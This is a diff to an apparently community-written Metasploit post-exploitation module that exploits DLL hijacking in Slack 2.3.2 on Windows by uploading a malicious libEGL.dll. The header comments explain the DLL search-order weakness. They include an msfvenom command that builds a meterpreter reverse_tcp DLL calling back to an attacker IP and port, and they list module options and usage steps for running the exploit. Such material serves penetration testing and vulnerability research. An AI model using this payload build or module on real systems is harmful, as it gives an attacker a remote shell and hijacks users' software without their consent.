@@ -15,22 +15,35 @@
 # Software Link  : http://www.techspot.com/downloads/6754-slack.html
 #
 #
-# [ DESCRIPTION ]
-# deploy_service_payload.rb uploads your payload.exe to target system (DEPLOY_PATH)
-# and creates a service pointing to it (SERVICE_NAME). The service will auto-start
-# with windows with Local/System privileges. Rebooting the system or restarting the
-# service will run the malicious executable with elevated privileges.
-# "WARNING: This module will not delete the payload deployed"
+# [ SOFTWARE DETAILS ]
+# slack 2.3.2 - Real-time messaging that works. Get full access to your messages and archives,
+# upload files easily, and receive notifications whether you’re at your desk or on the go.
+# slack 2.3.2 its affected by dll hijacking method.
+#
+# [ ATTACK DETAILS ]
+# Depending on the configuration of the system, a program can decide the order of the directories
+# to be searched for a DLL to load. By default the order of this search is as follows:
+#
+# 1 - The directory from which the application is loaded
+# 2 - The current directory
+# 3 - The system directory, usually C:\\Windows\\System32\\
+# 4 - The 16-bit system directory - There is no dedicated function to retrieve the path of this directory.
+# 5 - The Windows directory. The GetWindowsDirector function is called to obtain this directory.
+# 6 - The directories that are listed in the PATH environment variable.
+#
+# In this case, the current directory is the problem. When a program makes a decision
+# to load a DLL from the current directory, it can lead to the DLL hijacking. To exploit
+# this vulnerability a local attacker can insert an executable file in the path of the service.
+#
 #
 # [ BUILD MALICIOUS DLL ]
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f dll -o libEGL.dll
 #
 #
-#
 # [ MODULE DEFAULT OPTIONS ]
 # The session number to run this module on        => set SESSION 3
 # The full path (local) of payload to be uploaded => set LOCAL_PATH /root/libEGL.dll
-# Revert libEGL.dll to is default stage?           => set REVERT_HIJACK true
+# Revert libEGL.dll to is default stage?          => set REVERT_HIJACK true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -48,7 +61,7 @@
 # msf post(slack_dll_hijack) > show advanced options
 # msf post(slack_dll_hijack) > set [option(s)]
 # msf post(slack_dll_hijack) > exploit
-#
+##
 
 
 
@@ -82,7 +95,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'dll hijacking in slack 2.3.2 software',
                         'Description'   => %q{
-                                        This post-exploitation module requires a meterpreter session to be able to upload/inject our libEGL.dll "WARNING: payload to send must be named as: libEGL.dll"
+                                        This post-exploitation module requires a meterpreter session to be able to upload/inject our libEGL.dll malicious agent into the path of the service (dll hijacking) "WARNING: payload to send must be named as: libEGL.dll"
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -91,11 +104,11 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover : Chaitanya Haritash', # vuln discover
                                 ],
  
-                        'Version'        => '$Revision: 1.0',
+                        'Version'        => '$Revision: 1.1',
                         'DisclosureDate' => 'dez 1 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
-                        'Privileged'     => 'false',
+                        'Privileged'     => 'false', # thats no need for privilege escalation..
                         'Targets'        =>
                                 [
                                          # tested on: windows 7 ultimate (32 bits)
@@ -104,10 +117,9 @@ class MetasploitModule < Msf::Post
                         'DefaultTarget'  => '3', # default its to run againts windows 7 ultimate (32 bits)
                         'References'     =>
                                 [
-                                         [ 'URL', 'https://www.exploit-db.com/exploits/40577/' ],
-
-
-
+                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
+                                         [ 'URL', 'http://www.techspot.com/downloads/6754-slack.html' ],
+                                         [ 'URL', 'https://blog.fortinet.com/2015/12/10/a-crash-course-in-dll-hijacking' ]
                                 ],
 			'DefaultOptions' =>
 				{
@@ -125,7 +137,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('REVERT_HIJACK', [ false, 'revert lbEGL.dll to default?' , false])
+                                OptBool.new('REVERT_HIJACK', [ false, 'Revert lbEGL.dll to default stage?' , false])
                         ], self.class)
  
         end
